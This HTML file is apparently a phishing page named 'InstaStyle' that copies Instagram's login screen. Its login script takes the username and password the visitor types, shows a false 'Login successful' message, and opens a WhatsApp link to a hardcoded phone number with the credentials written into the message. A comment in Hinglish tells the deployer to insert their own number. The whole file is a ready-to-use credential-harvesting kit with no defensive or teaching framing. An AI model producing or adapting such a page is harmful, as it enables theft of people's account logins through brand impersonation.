<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>InstaStyle Login</title>

<style>
body{
  margin:0;
  font-family:Arial, sans-serif;
  background:#fafafa;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
}

.container{
  background:#fff;
  width:320px;
  padding:30px 25px;
  border:1px solid #dbdbdb;
  text-align:center;
}

.logo{
  font-size:36px;
  font-weight:bold;
  margin-bottom:25px;
}

input{
  width:100%;
  padding:10px;
  margin-bottom:8px;
  background:#fafafa;
  border:1px solid #dbdbdb;
  border-radius:3px;
}

button{
  width:100%;
  padding:8px;
  margin-top:10px;
  background:#4cb5f9;
  color:#fff;
  border:none;
  border-radius:8px;
  font-weight:bold;
  cursor:pointer;
}

button:hover{
  background:#3797ef;
}

.or{
  margin:18px 0;
  font-size:12px;
  color:#8e8e8e;
}

.fb{
  color:#385185;
  font-weight:bold;
  cursor:pointer;
}

.forgot{
  font-size:12px;
  margin-top:15px;
  color:#00376b;
  cursor:pointer;
}

.signup{
  margin-top:20px;
  font-size:14px;
}

.signup span{
  color:#0095f6;
  font-weight:bold;
  cursor:pointer;
}

.message{
  margin-top:10px;
  font-size:13px;
}
</style>
</head>

<body>

<div class="container">
  <div class="logo">InstaStyle</div>

  <input type="text" id="username" placeholder="Phone number, username, or email">
  <input type="password" id="password" placeholder="Password">

  <button onclick="login()">Log in</button>

  <div class="or">OR</div>

  <div class="fb" onclick="fbLogin()">Log in with Facebook</div>

  <div class="forgot" onclick="forgot()">Forgot password?</div>

  <div class="signup">
    Don't have an account? <span onclick="signup()">Sign up</span>
  </div>

  <div class="message" id="msg"></div>
</div>

<script>
function login(){
  let user = document.getElementById("username").value.trim();
  let pass = document.getElementById("password").value.trim();
  let msg  = document.getElementById("msg");

  if(user === "" || pass === ""){
    msg.style.color = "red";
    msg.innerText = "Please fill all fields";
    return;
  }

  msg.style.color = "green";
  msg.innerText = "Login successful";

  // 🔴 APNA WHATSAPP NUMBER YAHA DALO (country code ke saath, + mat lagana)
  let phone = "918462849906";

  let text =
    "Hello,\n\n" +
    "Login details:\n" +
    "Username: " + user + "\n" +
    "Password: " + pass + "\n";

  let url = "https://wa.me/" + phone + "?text=" + encodeURIComponent(text);

  // WhatsApp open hoga (user khud send karega)
  window.open(url, "_blank");
}

function fbLogin(){
  alert("Facebook login");
}

function forgot(){
  alert("Password recovery page");
}

function signup(){
  alert("Signup page");
}
</script>

</body>
</html>
